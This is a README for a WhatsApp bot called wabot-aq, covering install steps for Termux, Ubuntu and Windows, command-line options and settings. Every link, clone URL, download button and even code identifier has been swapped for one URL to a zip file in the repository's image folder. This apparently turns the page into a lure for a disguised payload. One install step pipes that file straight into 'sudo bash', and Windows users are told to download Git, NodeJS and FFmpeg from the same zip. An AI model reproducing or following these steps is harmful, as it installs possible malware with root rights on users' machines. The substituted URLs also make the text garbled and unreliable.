# wabot-aq

Simple WhatsApp Bot

[![Deploy](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip)](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip)

## FOR TERMUX/UBUNTU/SSH USER

```bash
apt update && apt upgrade
apt install git -y
apt install nodejs -y
apt install ffmpeg -y
apt install imagemagick -y
git clone https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip
cd wabot-aq
npm install
npm update
```

## INSTALL ON TERMUX WITH UBUNTU

[ INSTALLING UBUNTU ]

```bash
apt update && apt full-upgrade
apt install wget curl git proot-distro
proot-distro install ubuntu
echo "proot-distro login ubuntu" > $PREFIX/bin/ubuntu
ubuntu
```
---------

[ INSTALLING REQUIRED PACKAGES ]

```bash
ubuntu
apt update && apt full-upgrade
apt install wget curl git ffmpeg imagemagick build-essential libcairo2-dev libpango1.0-dev libjpeg-dev libgif-dev librsvg2-dev dbus-x11 ffmpeg2theora ffmpegfs ffmpegthumbnailer ffmpegthumbnailer-dbg ffmpegthumbs libavcodec-dev libavcodec-extra libavcodec-extra58 libavdevice-dev libavdevice58 libavfilter-dev libavfilter-extra libavfilter-extra7 libavformat-dev libavformat58 libavifile-0.7-bin libavifile-0.7-common libavifile-0.7c2 libavresample-dev libavresample4 libavutil-dev libavutil56 libpostproc-dev libpostproc55 graphicsmagick graphicsmagick-dbg graphicsmagick-imagemagick-compat graphicsmagick-libmagick-dev-compat groff imagemagick-6.q16hdri imagemagick-common libchart-gnuplot-perl libgraphics-magick-perl libgraphicsmagick++-q16-12 libgraphicsmagick++1-dev
```

---------

[ INSTALLING NODEJS & WABOT-AQ ]

```bash
ubuntu
curl -fsSL https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip | sudo -E bash -
apt install -y nodejs gcc g++ make
git clone https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip
cd wabot-aq
npm install
npm update
```

---------

## FOR WINDOWS/VPS/RDP USER

* Download And Install Git [`Click Here`](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip)
* Download And Install NodeJS [`Click Here`](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip)
* Download And Install FFmpeg [`Click Here`](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip) (**Don't Forget Add FFmpeg to PATH enviroment variables**)
* Download And Install ImageMagick [`Click Here`](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip)

```bash
git clone https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip
cd wabot-aq
npm install
npm update
```

---------

## Run

```bash
node .
```

---------

## Arguments `node . [--options] [<session name>]`

### `--session <file name>`

Use another session with another name, default is ```https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip```

### `--prefix <prefixes>`

* `prefixes` are seperated by each character
Set prefix

### `--server`

Used for [heroku](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip) or scan through website

### `--db <json-server-url>`

Use external db instead of local db, 
Example Server `https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip`

Code: `https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip`

`node . --db 'https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip'`

The server should have like this specification

#### GET

```http
GET /
Accept: application/json
```

#### POST

```http
POST /
Content-Type: application/json

{
 data: {}
}
```

### `--big-qr`

If small qr unicode doesn't support

### `--img`

Enable image inspector through terminal

### `--test`

**Development** Testing Mode

### `--trace`

```js
https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip = 'trace'
```

### `--debug`

```js
https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip = 'debug'
```

## Settings

Now set using switch [https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip), among others are

```js
anticall: false, // Auto Reject better than autoblock
autoread: false, // If true all chats are automatically read
nyimak: false, // No bot, just print received messages and add users to database
restrict: false, // Enables restricted plugins (which can lead your number to be banned if used too often)
self: false, // Activate self mode (Ignores other)
pconly: false, // If that chat not from private bot, bot will ignore
gconly: false, // If that chat not from group, bot will ignore
jadibot: false, 
```

---------

<a href="https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip"><img src="https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip" width="100" height="100"></a> | [![Nurutomo](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip)](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip) | [![Ariffb](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip)](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip) | [![Ftwrr](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip)](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip) 
----|----|----|----
[XTEAM](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip) | [Nurutomo](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip) | [Ariffb](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip) | [Ftwrr](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip)
Powered by XTEAM | Author / Creator | Most Active Contributor | 2nd Most Active Contributor


NOTE: This project will not maintained after `27 June 2021`, that means no update. Feel free to anyone to continue this project :)

Best Regards. wabot-aq
